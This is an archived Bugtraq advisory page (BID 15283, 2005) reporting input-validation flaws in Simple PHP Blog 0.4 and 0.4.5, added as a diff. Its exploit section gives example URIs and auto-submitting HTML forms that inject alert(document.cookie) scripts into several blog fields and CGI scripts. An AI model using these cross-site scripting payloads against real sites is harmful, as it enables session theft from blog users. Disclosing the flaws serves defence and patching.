@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid15283<p><b><span style="font-size: 18pt;">Simple PHP Blog Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15283/info">info</a><br><a href="http://www.securityfocus.com/bid/15283/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15283/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15283/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15283/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15283
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 02 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 02 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				enji@infosys.tuwien.ac.at is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Simple PHP Blog Simple PHP Blog 0.4.5 <br/>
+					
+				
+					Simple PHP Blog Simple PHP Blog 0.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>Example URI and HTML code have been provided:<br/><br/>http://localhost/~enji/path-to-sphpblog/preview_static_cgi.php?entry=foo"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/><br/> http://www.example.com/path-to-sphpblog/preview_cgi.php?entry=foo"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/preview_cgi.php" method="post"&gt;<br/>        &lt;input name="blog_subject" value='"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/preview_cgi.php" method="post"&gt;<br/>    &lt;input name="blog_text" value='&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/preview_static_cgi.php" method="post"&gt;<br/>        &lt;input name="blog_subject" value='"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/preview_static_cgi.php" method="post"&gt;<br/>    &lt;input name="blog_text" value='&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/preview_static_cgi.php" method="post"&gt;<br/>    &lt;input name="file_name" value='"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/colors_cgi.php" method="post"&gt;<br/>        &lt;input name="save_btn" value="1"/&gt;<br/>        &lt;input name="scheme_name" value='"&gt;&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input name="scheme_file" value="blabla"/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;<br/><br/>    &lt;form action="http://your-server/path-to-sphpblog/colors_cgi.php" method="post"&gt;<br/>        &lt;input name="save_btn" value="1"/&gt;<br/>        &lt;input name="scheme_name" value="myscheme"/&gt;<br/>        &lt;input name="scheme_file" value="blabla"/&gt;<br/>        &lt;input name="bg_color" value='"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'/&gt;<br/>        &lt;input type="submit"/&gt;<br/>    &lt;/form&gt;<br/><br/>    &lt;script type="text/javascript"&gt;<br/>      document.forms0.submit();<br/>    &lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
